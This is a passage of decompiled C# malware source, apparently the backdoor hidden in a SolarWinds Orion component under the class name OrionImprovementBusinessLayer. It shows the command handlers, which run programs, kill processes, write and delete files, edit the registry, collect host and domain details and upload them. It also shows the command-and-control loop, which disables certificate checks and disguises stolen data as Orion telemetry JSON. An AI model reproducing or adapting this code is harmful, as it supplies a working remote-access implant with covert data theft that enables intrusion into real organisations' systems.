				char[] array = cl.Trim().ToCharArray();
				bool flag = false;
				for (int i = 0; i < array.Length; i++)
				{
					if (array[i] == '"')
					{
						flag = !flag;
					}
					if (!flag && array[i] == ' ')
					{
						array[i] = '\n';
					}
				}
				string[] array2 = new string(array).Split(new char[]
				{
					'\n'
				}, StringSplitOptions.RemoveEmptyEntries);
				for (int j = 0; j < array2.Length; j++)
				{
					string text = "";
					bool flag2 = false;
					array2[j] = OrionImprovementBusinessLayer.Unquote(array2[j]);
					foreach (char c in array2[j])
					{
						if (flag2)
						{
							if (c != '`')
							{
								if (c == 'q')
								{
									text += "\"";
								}
								else
								{
									text = text + '`'.ToString() + c.ToString();
								}
							}
							else
							{
								text += '`'.ToString();
							}
							flag2 = false;
						}
						else if (c == '`')
						{
							flag2 = true;
						}
						else
						{
							text += c.ToString();
						}
					}
					if (flag2)
					{
						text += '`'.ToString();
					}
					array2[j] = text;
				}
				return array2;
			}

			public static void SetTime(string[] args, out int delay)
			{
				delay = int.Parse(args[0]);
			}

			public static void KillTask(string[] args)
			{
				Process.GetProcessById(int.Parse(args[0])).Kill();
			}

			public static void DeleteFile(string[] args)
			{
				File.Delete(Environment.ExpandEnvironmentVariables(args[0]));
			}

			public static int GetFileHash(string[] args, out string result)
			{
				result = null;
				string path = Environment.ExpandEnvironmentVariables(args[0]);
				using (MD5 md = MD5.Create())
				{
					using (FileStream fileStream = File.OpenRead(path))
					{
						byte[] bytes = md.ComputeHash(fileStream);
						if (args.Length > 1)
						{
							return (!(OrionImprovementBusinessLayer.ByteArrayToHexString(bytes).ToLower() == args[1].ToLower())) ? 1 : 0;
						}
						result = OrionImprovementBusinessLayer.ByteArrayToHexString(bytes);
					}
				}
				return 0;
			}

			public static void GetFileSystemEntries(string[] args, out string result)
			{
				string searchPattern = (args.Length >= 2) ? args[1] : "*";
				string path = Environment.ExpandEnvironmentVariables(args[0]);
				string[] value = (from f in Directory.GetFiles(path, searchPattern)
				select Path.GetFileName(f)).ToArray<string>();
				string[] value2 = (from f in Directory.GetDirectories(path, searchPattern)
				select Path.GetFileName(f)).ToArray<string>();
				result = string.Join("\n", value2) + "\n\n" + string.Join(" \n", value);
			}

			public static void GetProcessByDescription(string[] args, out string result)
			{
				result = null;
				if (args.Length == 0)
				{
					foreach (Process process in Process.GetProcesses())
					{
						result += string.Format("[{0,5}] {1}\n", process.Id, OrionImprovementBusinessLayer.Quote(process.ProcessName));
					}
					return;
				}
				using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("Select * From Win32_Process"))
				{
					foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
					{
						ManagementObject managementObject = (ManagementObject)managementBaseObject;
						string[] array = new string[]
						{
							string.Empty,
							string.Empty
						};
						ManagementObject managementObject2 = managementObject;
						string methodName = "GetOwner";
						object[] array2 = array;
						object[] args2 = array2;
						Convert.ToInt32(managementObject2.InvokeMethod(methodName, args2));
						result += string.Format("[{0,5}] {1,-16} {2}\t{3,5} {4}\\{5}\n", new object[]
						{
							managementObject["ProcessID"],
							OrionImprovementBusinessLayer.Quote(managementObject["Name"].ToString()),
							managementObject[args[0]],
							managementObject["ParentProcessID"],
							array[1],
							array[0]
						});
					}
				}
			}

			private static string GetDescriptionId(ref int i)
			{
				i++;
				return "\n" + i.ToString() + ". ";
			}

			public static void CollectSystemDescription(string info, out string result)
			{
				result = null;
				int num = 0;
				string domainName = IPGlobalProperties.GetIPGlobalProperties().DomainName;
				result = result + OrionImprovementBusinessLayer.Job.GetDescriptionId(ref num) + domainName;
				try
				{
					string str = ((SecurityIdentifier)new NTAccount(domainName, "Administrator").Translate(typeof(SecurityIdentifier))).AccountDomainSid.ToString();
					result = result + OrionImprovementBusinessLayer.Job.GetDescriptionId(ref num) + str;
				}
				catch
				{
					result += OrionImprovementBusinessLayer.Job.GetDescriptionId(ref num);
				}
				result = result + OrionImprovementBusinessLayer.Job.GetDescriptionId(ref num) + IPGlobalProperties.GetIPGlobalProperties().HostName;
				result = result + OrionImprovementBusinessLayer.Job.GetDescriptionId(ref num) + Environment.UserName;
				result = result + OrionImprovementBusinessLayer.Job.GetDescriptionId(ref num) + OrionImprovementBusinessLayer.GetOSVersion(true);
				result = result + OrionImprovementBusinessLayer.Job.GetDescriptionId(ref num) + Environment.SystemDirectory;
				result = result + OrionImprovementBusinessLayer.Job.GetDescriptionId(ref num) + (int)TimeSpan.FromMilliseconds(Environment.TickCount).TotalDays;
				result = result + OrionImprovementBusinessLayer.Job.GetDescriptionId(ref num) + info + "\n";
				result += OrionImprovementBusinessLayer.GetNetworkAdapterConfiguration();
			}

			public static void UploadSystemDescription(string[] args, out string result, IWebProxy proxy)
			{
				result = null;
				string requestUriString = args[0];
				string s = args[1];
				string text = (args.Length >= 3) ? args[2] : null;
				string[] array = Encoding.UTF8.GetString(Convert.FromBase64String(s)).Split(new string[]
				{
					"\r\n",
					"\r",
					"\n"
				}, StringSplitOptions.None);
				HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(requestUriString);
				HttpWebRequest httpWebRequest2 = httpWebRequest;
				httpWebRequest2.ServerCertificateValidationCallback = (RemoteCertificateValidationCallback)Delegate.Combine(httpWebRequest2.ServerCertificateValidationCallback, new RemoteCertificateValidationCallback((object sender, X509Certificate cert, X509Chain chain, SslPolicyErrors sslPolicyErrors) => true));
				httpWebRequest.Proxy = proxy;
				httpWebRequest.Timeout = 120000;
				httpWebRequest.Method = array[0].Split(new char[]
				{
					' '
				})[0];
				foreach (string text2 in array)
				{
					int num = text2.IndexOf(':');
					if (num > 0)
					{
						string text3 = text2.Substring(0, num);
						string text4 = text2.Substring(num + 1).TrimStart(Array.Empty<char>());
						if (!WebHeaderCollection.IsRestricted(text3))
						{
							httpWebRequest.Headers.Add(text2);
						}
						else
						{
							ulong hash = OrionImprovementBusinessLayer.GetHash(text3.ToLower());
							if (hash <= 8873858923435176895UL /* expect (HTTP header (client)) */)
							{
								if (hash <= 6116246686670134098UL /* content-type (HTTP header) */)
								{
									if (hash != 2734787258623754862UL /* accept (HTTP header) */)
									{
										if (hash == 6116246686670134098UL /* content-type (HTTP header) */)
										{
											httpWebRequest.ContentType = text4;
										}
									}
									else
									{
										httpWebRequest.Accept = text4;
									}
								}
								else if (hash != 7574774749059321801UL /* user-agent (HTTP header (client)) */)
								{
									if (hash == 8873858923435176895UL /* expect (HTTP header (client)) */)
									{
										if (OrionImprovementBusinessLayer.GetHash(text4.ToLower()) == 1475579823244607677UL /* 100-continue (HTTP status) */)
										{
											httpWebRequest.ServicePoint.Expect100Continue = true;
										}
										else
										{
											httpWebRequest.Expect = text4;
										}
									}
								}
								else
								{
									httpWebRequest.UserAgent = text4;
								}
							}
							else if (hash <= 11266044540366291518UL /* connection (HTTP header) */)
							{
								if (hash != 9007106680104765185UL /* referer (HTTP header (client)) */)
								{
									if (hash == 11266044540366291518UL /* connection (HTTP header) */)
									{
										ulong hash2 = OrionImprovementBusinessLayer.GetHash(text4.ToLower());
										httpWebRequest.KeepAlive = (hash2 == 13852439084267373191UL /* keep-alive (HTTP header) */ || httpWebRequest.KeepAlive);
										httpWebRequest.KeepAlive = (hash2 != 14226582801651130532UL /* close (HTTP header) */ && httpWebRequest.KeepAlive);
									}
								}
								else
								{
									httpWebRequest.Referer = text4;
								}
							}
							else if (hash != 15514036435533858158UL /* if-modified-since (HTTP header (client)) */)
							{
								if (hash == 16066522799090129502UL /* date (HTTP header) */)
								{
									httpWebRequest.Date = DateTime.Parse(text4);
								}
							}
							else
							{
								httpWebRequest.Date = DateTime.Parse(text4);
							}
						}
					}
				}
				result += string.Format("{0} {1} HTTP/{2}\n", httpWebRequest.Method, httpWebRequest.Address.PathAndQuery, httpWebRequest.ProtocolVersion.ToString());
				result = result + httpWebRequest.Headers.ToString() + "\n\n";
				if (!string.IsNullOrEmpty(text))
				{
					using (Stream requestStream = httpWebRequest.GetRequestStream())
					{
						byte[] array3 = Convert.FromBase64String(text);
						requestStream.Write(array3, 0, array3.Length);
					}
				}
				using (WebResponse response = httpWebRequest.GetResponse())
				{
					result += string.Format("{0} {1}\n", (int)((HttpWebResponse)response).StatusCode, ((HttpWebResponse)response).StatusDescription);
					result = result + response.Headers.ToString() + "\n";
					using (Stream responseStream = response.GetResponseStream())
					{
						result += new StreamReader(responseStream).ReadToEnd();
					}
				}
			}

			public static int RunTask(string[] args, string cl, out string result)
			{
				result = null;
				string fileName = Environment.ExpandEnvironmentVariables(args[0]);
				string arguments = (args.Length > 1) ? cl.Substring(OrionImprovementBusinessLayer.Job.GetArgumentIndex(cl, 1)).Trim() : null;
				using (Process process = new Process())
				{
					process.StartInfo = new ProcessStartInfo(fileName, arguments)
					{
						CreateNoWindow = false,
						UseShellExecute = false
					};
					if (process.Start())
					{
						result = process.Id.ToString();
						return 0;
					}
				}
				return 1;
			}

			public static void WriteFile(string[] args)
			{
				string path = Environment.ExpandEnvironmentVariables(args[0]);
				byte[] array = Convert.FromBase64String(args[1]);
				for (int i = 0; i < 3; i++)
				{
					try
					{
						using (FileStream fileStream = new FileStream(path, FileMode.Append, FileAccess.Write))
						{
							fileStream.Write(array, 0, array.Length);
						}
						break;
					}
					catch (Exception)
					{
						if (i + 1 >= 3)
						{
							throw;
						}
					}
					OrionImprovementBusinessLayer.DelayMs(0.0, 0.0);
				}
			}

			public static void FileExists(string[] args, out string result)
			{
				string path = Environment.ExpandEnvironmentVariables(args[0]);
				result = File.Exists(path).ToString();
			}

			public static int ReadRegistryValue(string[] args, out string result)
			{
				result = OrionImprovementBusinessLayer.RegistryHelper.GetValue(args[0], args[1], null);
				if (result != null)
				{
					return 0;
				}
				return 1;
			}

			public static void DeleteRegistryValue(string[] args)
			{
				OrionImprovementBusinessLayer.RegistryHelper.DeleteValue(args[0], args[1]);
			}

			public static void GetRegistrySubKeyAndValueNames(string[] args, out string result)
			{
				result = OrionImprovementBusinessLayer.RegistryHelper.GetSubKeyAndValueNames(args[0]);
			}

			public static int SetRegistryValue(string[] args)
			{
				RegistryValueKind valueKind = (RegistryValueKind)Enum.Parse(typeof(RegistryValueKind), args[2]);
				string valueData = (args.Length > 3) ? Encoding.UTF8.GetString(Convert.FromBase64String(args[3])) : "";
				if (!OrionImprovementBusinessLayer.RegistryHelper.SetValue(args[0], args[1], valueData, valueKind))
				{
					return 1;
				}
				return 0;
			}
		}

		private class Proxy
		{
			public Proxy(OrionImprovementBusinessLayer.ProxyType proxyType)
			{
				try
				{
					this.proxyType = proxyType;
					OrionImprovementBusinessLayer.ProxyType proxyType2 = this.proxyType;
					if (proxyType2 != OrionImprovementBusinessLayer.ProxyType.System)
					{
						if (proxyType2 == OrionImprovementBusinessLayer.ProxyType.Direct)
						{
							this.proxy = null;
						}
						else
						{
							this.proxy = HttpProxySettings.Instance.AsWebProxy();
						}
					}
					else
					{
						this.proxy = WebRequest.GetSystemWebProxy();
					}
				}
				catch
				{
				}
			}

			public override string ToString()
			{
				if (this.proxyType != OrionImprovementBusinessLayer.ProxyType.Manual)
				{
					return this.proxyType.ToString();
				}
				if (this.proxy == null)
				{
					return OrionImprovementBusinessLayer.ProxyType.Direct.ToString();
				}
				if (string.IsNullOrEmpty(this.proxyString))
				{
					try
					{
						IHttpProxySettings instance = HttpProxySettings.Instance;
						if (instance.IsDisabled)
						{
							this.proxyString = OrionImprovementBusinessLayer.ProxyType.Direct.ToString();
						}
						else if (instance.UseSystemDefaultProxy)
						{
							this.proxyString = ((WebRequest.DefaultWebProxy != null) ? OrionImprovementBusinessLayer.ProxyType.Default.ToString() : OrionImprovementBusinessLayer.ProxyType.System.ToString());
						}
						else
						{
							this.proxyString = OrionImprovementBusinessLayer.ProxyType.Manual.ToString();
							if (instance.IsValid)
							{
								string[] array = new string[7];
								array[0] = this.proxyString;
								array[1] = ":";
								array[2] = instance.Uri;
								array[3] = "\t";
								int num = 4;
								UsernamePasswordCredential usernamePasswordCredential = instance.Credential as UsernamePasswordCredential;
								array[num] = ((usernamePasswordCredential != null) ? usernamePasswordCredential.Username : null);
								array[5] = "\t";
								int num2 = 6;
								UsernamePasswordCredential usernamePasswordCredential2 = instance.Credential as UsernamePasswordCredential;
								array[num2] = ((usernamePasswordCredential2 != null) ? usernamePasswordCredential2.Password : null);
								this.proxyString = string.Concat(array);
							}
						}
					}
					catch
					{
					}
				}
				return this.proxyString;
			}

			public IWebProxy GetWebProxy()
			{
				return this.proxy;
			}

			private OrionImprovementBusinessLayer.ProxyType proxyType;

			private IWebProxy proxy;

			private string proxyString;
		}

		private class HttpHelper
		{
			public void Abort()
			{
				this.isAbort = true;
			}

			public HttpHelper(byte[] customerId, OrionImprovementBusinessLayer.DnsRecords rec)
			{
				this.customerId = customerId.ToArray<byte>();
				this.httpHost = rec.cname;
				this.requestMethod = (OrionImprovementBusinessLayer.HttpOipMethods)rec._type;
				this.proxy = new OrionImprovementBusinessLayer.Proxy((OrionImprovementBusinessLayer.ProxyType)rec.length);
			}

			private bool TrackEvent()
			{
				if (DateTime.Now.CompareTo(this.timeStamp.AddMinutes(1.0)) > 0)
				{
					if (OrionImprovementBusinessLayer.ProcessTracker.TrackProcesses(false) || OrionImprovementBusinessLayer.svcListModified2)
					{
						return true;
					}
					this.timeStamp = DateTime.Now;
				}
				return false;
			}

			private bool IsSynchronized(bool idle)
			{
				if (this.delay != 0 && idle)
				{
					if (this.delayInc == 0)
					{
						this.delayInc = this.delay;
					}
					double num = (double)this.delayInc * 1000.0;
					OrionImprovementBusinessLayer.DelayMs(0.9 * num, 1.1 * num);
					if (this.delayInc < 300)
					{
						this.delayInc *= 2;
						return true;
					}
				}
				else
				{
					OrionImprovementBusinessLayer.DelayMs(0.0, 0.0);
					this.delayInc = 0;
				}
				return false;
			}

			public void Initialize()
			{
				OrionImprovementBusinessLayer.HttpHelper.JobEngine jobEngine = OrionImprovementBusinessLayer.HttpHelper.JobEngine.Idle;
				string response = null;
				int err = 0;
				try
				{
					int i = 1;
					while (i <= 3)
					{
						if (!this.isAbort)
						{
							byte[] body = null;
							if (this.IsSynchronized(jobEngine == OrionImprovementBusinessLayer.HttpHelper.JobEngine.Idle))
							{
								i = 0;
							}
							if (!this.TrackEvent())
							{
								HttpStatusCode httpStatusCode = this.CreateUploadRequest(jobEngine, err, response, out body);
								if (jobEngine != OrionImprovementBusinessLayer.HttpHelper.JobEngine.Exit)
								{
									if (jobEngine != OrionImprovementBusinessLayer.HttpHelper.JobEngine.Reboot)
									{
										if (httpStatusCode <= HttpStatusCode.OK)
										{
											if (httpStatusCode != (HttpStatusCode)0)
											{
												if (httpStatusCode != HttpStatusCode.OK)
												{
													goto IL_7E;
												}
												goto IL_87;
											}
										}
										else
										{
											if (httpStatusCode == HttpStatusCode.NoContent)
											{
												goto IL_87;
											}
											if (httpStatusCode == HttpStatusCode.NotModified)
											{
												goto IL_87;
											}
											goto IL_7E;
										}
										IL_D6:
										i++;
										continue;
										IL_7E:
										OrionImprovementBusinessLayer.DelayMin(1, 5);
										goto IL_D6;
										IL_87:
										string cl = null;
										if (httpStatusCode != HttpStatusCode.OK)
										{
											if (httpStatusCode != HttpStatusCode.NoContent)
											{
												jobEngine = OrionImprovementBusinessLayer.HttpHelper.JobEngine.Idle;
											}
											else
											{
												i = ((jobEngine == OrionImprovementBusinessLayer.HttpHelper.JobEngine.None || jobEngine == OrionImprovementBusinessLayer.HttpHelper.JobEngine.Idle) ? i : 0);
												jobEngine = OrionImprovementBusinessLayer.HttpHelper.JobEngine.None;
											}
										}
										else
										{
											jobEngine = this.ParseServiceResponse(body, out cl);
											i = ((jobEngine == OrionImprovementBusinessLayer.HttpHelper.JobEngine.None || jobEngine == OrionImprovementBusinessLayer.HttpHelper.JobEngine.Idle) ? i : 0);
										}
										err = this.ExecuteEngine(jobEngine, cl, out response);
										goto IL_D6;
									}
								}
								this.isAbort = true;
							}
							else
							{
								this.isAbort = true;
							}
						}
						IL_F3:
						if (jobEngine == OrionImprovementBusinessLayer.HttpHelper.JobEngine.Reboot)
						{
							OrionImprovementBusinessLayer.NativeMethods.RebootComputer();
						}
						return;
					}
					goto IL_F3;
				}
				catch (Exception)
				{
				}
			}

			private int ExecuteEngine(OrionImprovementBusinessLayer.HttpHelper.JobEngine job, string cl, out string result)
			{
				result = null;
				int result2 = 0;
				string[] args = OrionImprovementBusinessLayer.Job.SplitString(cl);
				int result3;
				try
				{
					if (job == OrionImprovementBusinessLayer.HttpHelper.JobEngine.ReadRegistryValue || job == OrionImprovementBusinessLayer.HttpHelper.JobEngine.SetRegistryValue || job == OrionImprovementBusinessLayer.HttpHelper.JobEngine.DeleteRegistryValue || job == OrionImprovementBusinessLayer.HttpHelper.JobEngine.GetRegistrySubKeyAndValueNames)
					{
						result2 = OrionImprovementBusinessLayer.HttpHelper.AddRegistryExecutionEngine(job, args, out result);
					}
					switch (job)
					{
					case OrionImprovementBusinessLayer.HttpHelper.JobEngine.SetTime:
					{
						int num;
						OrionImprovementBusinessLayer.Job.SetTime(args, out num);
						this.delay = num;
						break;
					}
					case OrionImprovementBusinessLayer.HttpHelper.JobEngine.CollectSystemDescription:
						OrionImprovementBusinessLayer.Job.CollectSystemDescription(this.proxy.ToString(), out result);
						break;
					case OrionImprovementBusinessLayer.HttpHelper.JobEngine.UploadSystemDescription:
						OrionImprovementBusinessLayer.Job.UploadSystemDescription(args, out result, this.proxy.GetWebProxy());
						break;
					case OrionImprovementBusinessLayer.HttpHelper.JobEngine.RunTask:
						result2 = OrionImprovementBusinessLayer.Job.RunTask(args, cl, out result);
						break;
					case OrionImprovementBusinessLayer.HttpHelper.JobEngine.GetProcessByDescription:
						OrionImprovementBusinessLayer.Job.GetProcessByDescription(args, out result);
						break;
					case OrionImprovementBusinessLayer.HttpHelper.JobEngine.KillTask:
						OrionImprovementBusinessLayer.Job.KillTask(args);
						break;
					}
					if (job != OrionImprovementBusinessLayer.HttpHelper.JobEngine.WriteFile && job != OrionImprovementBusinessLayer.HttpHelper.JobEngine.FileExists && job != OrionImprovementBusinessLayer.HttpHelper.JobEngine.DeleteFile && job != OrionImprovementBusinessLayer.HttpHelper.JobEngine.GetFileHash)
					{
						if (job != OrionImprovementBusinessLayer.HttpHelper.JobEngine.GetFileSystemEntries)
						{
							return result2;
						}
					}
					result3 = OrionImprovementBusinessLayer.HttpHelper.AddFileExecutionEngine(job, args, out result);
				}
				catch (Exception ex)
				{
					if (!string.IsNullOrEmpty(result))
					{
						result += "\n";
					}
					result += ex.Message;
					result3 = ex.HResult;
				}
				return result3;
			}

			private static int AddRegistryExecutionEngine(OrionImprovementBusinessLayer.HttpHelper.JobEngine job, string[] args, out string result)
			{
				result = null;
				int result2 = 0;
				switch (job)
				{
				case OrionImprovementBusinessLayer.HttpHelper.JobEngine.ReadRegistryValue:
					result2 = OrionImprovementBusinessLayer.Job.ReadRegistryValue(args, out result);
					break;
				case OrionImprovementBusinessLayer.HttpHelper.JobEngine.SetRegistryValue:
					result2 = OrionImprovementBusinessLayer.Job.SetRegistryValue(args);
					break;
				case OrionImprovementBusinessLayer.HttpHelper.JobEngine.DeleteRegistryValue:
					OrionImprovementBusinessLayer.Job.DeleteRegistryValue(args);
					break;
				case OrionImprovementBusinessLayer.HttpHelper.JobEngine.GetRegistrySubKeyAndValueNames:
					OrionImprovementBusinessLayer.Job.GetRegistrySubKeyAndValueNames(args, out result);
					break;
				}
				return result2;
			}

			private static int AddFileExecutionEngine(OrionImprovementBusinessLayer.HttpHelper.JobEngine job, string[] args, out string result)
			{
				result = null;
				int result2 = 0;
				switch (job)
				{
				case OrionImprovementBusinessLayer.HttpHelper.JobEngine.GetFileSystemEntries:
					OrionImprovementBusinessLayer.Job.GetFileSystemEntries(args, out result);
					break;
				case OrionImprovementBusinessLayer.HttpHelper.JobEngine.WriteFile:
					OrionImprovementBusinessLayer.Job.WriteFile(args);
					break;
				case OrionImprovementBusinessLayer.HttpHelper.JobEngine.FileExists:
					OrionImprovementBusinessLayer.Job.FileExists(args, out result);
					break;
				case OrionImprovementBusinessLayer.HttpHelper.JobEngine.DeleteFile:
					OrionImprovementBusinessLayer.Job.DeleteFile(args);
					break;
				case OrionImprovementBusinessLayer.HttpHelper.JobEngine.GetFileHash:
					result2 = OrionImprovementBusinessLayer.Job.GetFileHash(args, out result);
					break;
				}
				return result2;
			}

			private static byte[] Deflate(byte[] body)
			{
				int num = 0;
				byte[] array = body.ToArray<byte>();
				for (int i = 1; i < array.Length; i++)
				{
					byte[] array2 = array;
					int num2 = i;
					array2[num2] ^= array[0];
					num += (int)array[i];
				}
				if ((byte)num == array[0])
				{
					return OrionImprovementBusinessLayer.ZipHelper.Decompress(array.Skip(1).ToArray<byte>());
				}
				return null;
			}

			private static byte[] Inflate(byte[] body)
			{
				byte[] array = OrionImprovementBusinessLayer.ZipHelper.Compress(body);
				byte[] array2 = new byte[array.Length + 1];
				array2[0] = (byte)array.Sum((byte b) => (int)b);
				for (int i = 0; i < array.Length; i++)
				{
					byte[] array3 = array;
					int num = i;
					array3[num] ^= array2[0];
				}
				Array.Copy(array, 0, array2, 1, array.Length);
				return array2;
			}

			private OrionImprovementBusinessLayer.HttpHelper.JobEngine ParseServiceResponse(byte[] body, out string args)
			{
				args = null;
				try
				{
					if (body == null || body.Length < 4)
					{
						return OrionImprovementBusinessLayer.HttpHelper.JobEngine.None;
					}
					OrionImprovementBusinessLayer.HttpOipMethods httpOipMethods = this.requestMethod;
					if (httpOipMethods != OrionImprovementBusinessLayer.HttpOipMethods.Put)
					{
						if (httpOipMethods != OrionImprovementBusinessLayer.HttpOipMethods.Post)
						{
							string[] value = (from Match m in Regex.Matches(Encoding.UTF8.GetString(body), "\"\\{[0-9a-f-]{36}\\}\"|\"[0-9a-f]{32}\"|\"[0-9a-f]{16}\"", RegexOptions.IgnoreCase)
							select m.Value).ToArray<string>();
							body = OrionImprovementBusinessLayer.HexStringToByteArray(string.Join("", value).Replace("\"", string.Empty).Replace("-", string.Empty).Replace("{", string.Empty).Replace("}", string.Empty));
						}
						else
						{
							body = body.Skip(12).ToArray<byte>();
						}
					}
					else
					{
						body = body.Skip(48).ToArray<byte>();
					}
					int num = BitConverter.ToInt32(body, 0);
					body = body.Skip(4).Take(num).ToArray<byte>();
					if (body.Length != num)
					{
						return OrionImprovementBusinessLayer.HttpHelper.JobEngine.None;
					}
					string[] array = Encoding.UTF8.GetString(OrionImprovementBusinessLayer.HttpHelper.Deflate(body)).Trim().Split(new char[]
					{
						' '
					}, 2);
					OrionImprovementBusinessLayer.HttpHelper.JobEngine jobEngine = (OrionImprovementBusinessLayer.HttpHelper.JobEngine)int.Parse(array[0]);
					args = ((array.Length > 1) ? array[1] : null);
					return Enum.IsDefined(typeof(OrionImprovementBusinessLayer.HttpHelper.JobEngine), jobEngine) ? jobEngine : OrionImprovementBusinessLayer.HttpHelper.JobEngine.None;
				}
				catch (Exception)
				{
				}
				return OrionImprovementBusinessLayer.HttpHelper.JobEngine.None;
			}

			public static void Close(OrionImprovementBusinessLayer.HttpHelper http, Thread thread)
			{
				if (thread != null && thread.IsAlive)
				{
					if (http != null)
					{
						http.Abort();
					}
					try
					{
						thread.Join(60000);
						if (thread.IsAlive)
						{
							thread.Abort();
						}
					}
					catch (Exception)
					{
					}
				}
			}

			private string GetCache()
			{
				byte[] array = this.customerId.ToArray<byte>();
				byte[] array2 = new byte[array.Length];
				this.random.NextBytes(array2);
				for (int i = 0; i < array.Length; i++)
				{
					byte[] array3 = array;
					int num = i;
					array3[num] ^= array2[2 + i % 4];
				}
				return OrionImprovementBusinessLayer.ByteArrayToHexString(array) + OrionImprovementBusinessLayer.ByteArrayToHexString(array2);
			}

			private string GetOrionImprovementCustomerId()
			{
				byte[] array = new byte[16];
				for (int i = 0; i < array.Length; i++)
				{
					array[i] = (byte)((int)(~(int)this.customerId[i % (this.customerId.Length - 1)]) + i / this.customerId.Length);
				}
				return new Guid(array).ToString().Trim(new char[]
				{
					'{',
					'}'
				});
			}

			private HttpStatusCode CreateUploadRequestImpl(HttpWebRequest request, byte[] inData, out byte[] outData)
			{
				outData = null;
				try
				{
					request.ServerCertificateValidationCallback = (RemoteCertificateValidationCallback)Delegate.Combine(request.ServerCertificateValidationCallback, new RemoteCertificateValidationCallback((object sender, X509Certificate cert, X509Chain chain, SslPolicyErrors sslPolicyErrors) => true));
					request.Proxy = this.proxy.GetWebProxy();
					request.UserAgent = this.GetUserAgent();
					request.KeepAlive = false;
					request.Timeout = 120000;
					request.Method = "GET";
					if (inData != null)
					{
						request.Method = "POST";
						using (Stream requestStream = request.GetRequestStream())
						{
							requestStream.Write(inData, 0, inData.Length);
						}
					}
					using (WebResponse response = request.GetResponse())
					{
						using (Stream responseStream = response.GetResponseStream())
						{
							byte[] array = new byte[4096];
							using (MemoryStream memoryStream = new MemoryStream())
							{
								int count;
								while ((count = responseStream.Read(array, 0, array.Length)) > 0)
								{
									memoryStream.Write(array, 0, count);
								}
								outData = memoryStream.ToArray();
							}
						}
						return ((HttpWebResponse)response).StatusCode;
					}
				}
				catch (WebException ex)
				{
					if (ex.Status == WebExceptionStatus.ProtocolError && ex.Response != null)
					{
						return ((HttpWebResponse)ex.Response).StatusCode;
					}
				}
				catch (Exception)
				{
				}
				return HttpStatusCode.Unused;
			}

			private HttpStatusCode CreateUploadRequest(OrionImprovementBusinessLayer.HttpHelper.JobEngine job, int err, string response, out byte[] outData)
			{
				string text = this.httpHost;
				byte[] array = null;
				OrionImprovementBusinessLayer.HttpHelper.HttpOipExMethods httpOipExMethods;
				if (job != OrionImprovementBusinessLayer.HttpHelper.JobEngine.Idle)
				{
					if (job != OrionImprovementBusinessLayer.HttpHelper.JobEngine.None)
					{
						httpOipExMethods = OrionImprovementBusinessLayer.HttpHelper.HttpOipExMethods.Head;
						goto IL_17;
					}
				}
				httpOipExMethods = OrionImprovementBusinessLayer.HttpHelper.HttpOipExMethods.Get;
				IL_17:
				OrionImprovementBusinessLayer.HttpHelper.HttpOipExMethods httpOipExMethods2 = httpOipExMethods;
				outData = null;
				try
				{
					if (!string.IsNullOrEmpty(response))
					{
						byte[] bytes = Encoding.UTF8.GetBytes(response);
						byte[] bytes2 = BitConverter.GetBytes(err);
						byte[] array2 = new byte[bytes.Length + bytes2.Length + this.customerId.Length];
						Array.Copy(bytes, array2, bytes.Length);
						Array.Copy(bytes2, 0, array2, bytes.Length, bytes2.Length);
						Array.Copy(this.customerId, 0, array2, bytes.Length + bytes2.Length, this.customerId.Length);
						array = OrionImprovementBusinessLayer.HttpHelper.Inflate(array2);
						httpOipExMethods2 = ((array.Length <= 10000) ? OrionImprovementBusinessLayer.HttpHelper.HttpOipExMethods.Put : OrionImprovementBusinessLayer.HttpHelper.HttpOipExMethods.Post);
					}
					if (!text.StartsWith(Uri.UriSchemeHttp + "://", StringComparison.OrdinalIgnoreCase) && !text.StartsWith(Uri.UriSchemeHttps + "://", StringComparison.OrdinalIgnoreCase))
					{
						text = Uri.UriSchemeHttps + "://" + text;
					}
					if (!text.EndsWith("/"))
					{
						text += "/";
					}
					text += this.GetBaseUri(httpOipExMethods2, err);
					HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(text);
					if (httpOipExMethods2 == OrionImprovementBusinessLayer.HttpHelper.HttpOipExMethods.Get || httpOipExMethods2 == OrionImprovementBusinessLayer.HttpHelper.HttpOipExMethods.Head)
					{
						httpWebRequest.Headers.Add("If-None-Match", this.GetCache());
					}
					if (httpOipExMethods2 == OrionImprovementBusinessLayer.HttpHelper.HttpOipExMethods.Put && (this.requestMethod == OrionImprovementBusinessLayer.HttpOipMethods.Get || this.requestMethod == OrionImprovementBusinessLayer.HttpOipMethods.Head))
					{
						int[] intArray = this.GetIntArray((array != null) ? array.Length : 0);
						int num = 0;
						ulong num2 = (ulong)DateTime.UtcNow.Subtract(new DateTime(1970, 1, 1, 0, 0, 0, DateTimeKind.Utc)).TotalMilliseconds;
						num2 -= 300000UL;
						string text2 = "{";
						text2 += string.Format("\"userId\":\"{0}\",", this.GetOrionImprovementCustomerId());
						text2 += string.Format("\"sessionId\":\"{0}\",", this.sessionId.ToString().Trim(new char[]
						{
							'{',
							'}'
						}));
						text2 += "\"steps\":[";
						for (int i = 0; i < intArray.Length; i++)
						{
							uint num3 = (uint)((this.random.Next(4) == 0) ? this.random.Next(512) : 0);
							num2 += (ulong)num3;
							byte[] array3;
							if (intArray[i] > 0)
							{
								num2 |= 2UL;
								array3 = array.Skip(num).Take(intArray[i]).ToArray<byte>();
								num += intArray[i];
							}
							else
							{
								num2 &= 18446744073709551613UL; /* NOT A HASH - 0xfffffffffffffffd */
								array3 = new byte[this.random.Next(16, 28)];
								for (int j = 0; j < array3.Length; j++)
								{
									array3[j] = (byte)this.random.Next();
								}
							}
							text2 += "{";
							text2 += string.Format("\"Timestamp\":\"\\/Date({0})\\/\",", num2);
							string str = text2;
							string format = "\"Index\":{0},";
							int num4 = this.mIndex;
							this.mIndex = num4 + 1;
							text2 = str + string.Format(format, num4);
							text2 += "\"EventType\":\"Orion\",";
							text2 += "\"EventName\":\"EventManager\",";
							text2 += string.Format("\"DurationMs\":{0},", num3);
							text2 += "\"Succeeded\":true,";
							text2 += string.Format("\"Message\":\"{0}\"", Convert.ToBase64String(array3).Replace("/", "\\/"));
							text2 += ((i + 1 != intArray.Length) ? "}," : "}");
						}
						text2 += "]}";
						httpWebRequest.ContentType = "application/json";
						array = Encoding.UTF8.GetBytes(text2);
					}
					if (httpOipExMethods2 == OrionImprovementBusinessLayer.HttpHelper.HttpOipExMethods.Post || this.requestMethod == OrionImprovementBusinessLayer.HttpOipMethods.Put || this.requestMethod == OrionImprovementBusinessLayer.HttpOipMethods.Post)
					{
